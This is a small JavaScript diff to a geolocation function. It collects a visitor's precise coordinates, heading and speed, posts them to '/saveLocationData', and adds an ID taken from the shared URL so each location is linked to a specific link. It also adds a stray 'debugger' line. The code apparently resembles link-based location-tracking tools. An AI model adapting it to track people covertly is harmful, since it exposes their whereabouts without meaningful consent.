@@ -1,5 +1,6 @@
 function locate()
 {
+  debugger
   if(navigator.geolocation)
   {
     var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
@@ -18,12 +19,13 @@ function locate()
     var alt = position.coords.altitude;
     var dir = position.coords.heading;
     var spd = position.coords.speed;
+    var sharedId = window.location.href.split('/')[4];
 
     $.ajax({
       type: 'POST',
       // url: '/php/result.php',
       url: '/saveLocationData',
-      data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
+      data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd, urlId: sharedId},
       success: function(){popup();},
       mimeType: 'text'
     });
